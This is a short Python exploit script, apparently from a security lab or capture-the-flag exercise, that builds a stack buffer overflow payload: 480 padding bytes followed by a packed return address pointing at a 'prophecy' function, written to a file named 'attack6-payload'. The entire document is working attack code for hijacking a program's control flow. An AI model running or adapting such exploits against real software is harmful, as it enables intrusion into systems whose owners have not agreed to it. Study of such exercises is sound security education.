import struct

# Setting the padding size
padding_size = 480

# Address of the prophecy function
prophecy_address = 0x56556288
# Packing the prophecy function address
prophecy_address_packed = struct.pack('<I',prophecy_address)

#----------------------------
# Creating the payload
#----------------------------
# Adding padding to the payload
payload = b'A'* padding_size
# Writing the address of the prophecy function to the payload
payload += prophecy_address_packed

# Write into the attack6-payload file
with open("attack6-payload", "wb") as f:
    f.write(payload)
